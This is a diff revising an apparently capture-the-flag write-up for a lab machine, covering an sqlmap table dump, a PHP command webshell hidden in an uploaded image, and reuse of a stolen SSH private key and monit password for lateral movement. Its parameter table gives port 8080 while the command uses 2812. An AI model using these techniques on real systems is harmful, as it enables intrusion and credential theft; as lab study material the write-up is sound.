@@ -168,10 +168,7 @@ sqlmap -r req -p email --level 3 --batch --columns -T admin_users --dump
 ### Upload file:
 At the moment to enter into the website after cracking some passwords, we see a dashboard with information on installed dependencies, so we must search for possible exploits. There is a section to assign an avatar image to the **admin** user, so this could represent a possible AFU [*Arbitrary File Upload*]. 
 ####
-The dependency that comes closest to this is: [*Encode/larabel admin 1.8.18*]. Here there a good exploit that help us to exploit this vulnerability: 
-####
-- Exploit:
-    - [Arbitrary-File-Upload-CVE-2023-24249](https://flyd.uk/post/cve-2023-24249)
+The dependency that comes closest to this is: [*Encode/larabel admin 1.8.18*]. Here there a good exploit that help us to exploit this vulnerability: [CVE-2023-24249-AFU](https://flyd.uk/post/cve-2023-24249)
 ####
 We generate an image with its corresponding headers and insert some PHP code to obtain a **cmd** into this file, so form that if we change the file extention to **php**, we will are able to execute commands in the target machine doing use the **cmd** parameter into the url. Something similar to this: http://127.0.0.1/images/malicius.jpg.php?cmd=whoami.
 ####
@@ -234,10 +231,8 @@ elif response.status_code == 404:
 ####
 ####
 ## Lateral Movement
-### SSH Service:
-Investigating within the machine, we can read the **id_rsa** file [*ssh authentication via a file*], so the first thing is to ensure persistence as soon as possible. It's very tedious to go through the previous process with burpsuite. `cat ~/.ssh/id_rsa`. 
-####
-Searching for *SUID* permissions, we don't find anything, not even for **capabilities**, but there is an interesting file in the `/home` of the `dash` user, our current user. The **.monitrc** file is not common, which indicates a possible exploit vector. If we read the file, we see a username and password.
+#### SSH:
+Searching for *SUID* permissions, we don't find anything, not even for **capabilities**, but there is an interesting file in the `/home` directory of us user. The **.monitrc** file is not common, which indicates a possible exploit vector. If we read the file, we see a username and password.
 ####
 ```bash
 #Enable Web Access
@@ -246,7 +241,32 @@ use address 127.0.0.1
 allow admin:3nc0d3d_pa$$w0rd
 ```
 ####
-If we port forward that service: `ssh -L 2812:127.0.0.1:2812 dash@10.10.10.200`, we can authenticate, but the CVE exploit is not found on the Internet, so we have to find another way. If we do a: `ls /home` we see another user named `xander`, so if we try the monit service password: `3nc0d3d_pa$$w0rd` with this user, we gain immediate access as the **xander** user.
+Now we discovered a service that is running into the target machine of internal form. For be able to consult this service is necessary make a *Local Port Forwarding*. Let me see if our user have a `id_rsa`, effectivelly, we have that file, so if we read that file and save into a new `id_rsa` file in our machine.
+####
+We could use this approach to authenticate us like a **dash** user without a password. 
+####
+```ruby
+echo '
+    -----BEGIN OPENSSH PRIVATE KEY-----
+    b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+    NhAAAAAwEAAQAAAYEAopbNNL9kUO3gswJsA/bNyvlMbqGINWWQ7YZJfhiMii0BmnF0JCrv
+    mk8PAWSXkZlvka4IuTVvBOhWD7FmQqIBx4M/mf39BLjA1MbMH2CDkeWyCDsDQREsDtHs4c
+    Ww0JdcsOSSI8lx5RV8uS5wEeIeu7Nq40Mfjrg2TznDkuUwP0zMRnp41kUAptbDU1GafulA
+    CcFMuwTkqRI6JGSybVQwT6Gu8BS2IOg4PwfMPV9wkQMoFXU80hpeGzrY3T1UTNg9ujO0II
+    /dvJoeC11dfc+BQB57h0pr/FIMeFc6uju3nM/C43n+ii9nWHjHl/yOyIg9pfNKTbeG4aMD
+    wiFdPBMEQOA6BNGkq7HylWKQsStYa6yd329SACFWbT5cTegrMNYh5KOG3xB5woLt1J+cDU...
+' > id_rsa
+chmod 600 id_rsa
+ssh -L 2812:localhost:2812 -i id_rsa dash@10.10.10.200
+```
+####
+| SSH param | Description |
+| ----- | ----- |
+| -L | Local address to run the remote service |
+| 1. 8080 | Port over run the service in the target machine | 
+| 2. 8080 | Port over will run the service in the our machine |
+####
+Succesfully, we gain access in the target machine, but the flag is not here, exist other user in `/home` directory: `xander`, so we could try to authenticate us via *SSH* like **xander** user using the previuos passowrd: `3nc0d3d_pa$$w0rd`.
 ####
 ####
 ####
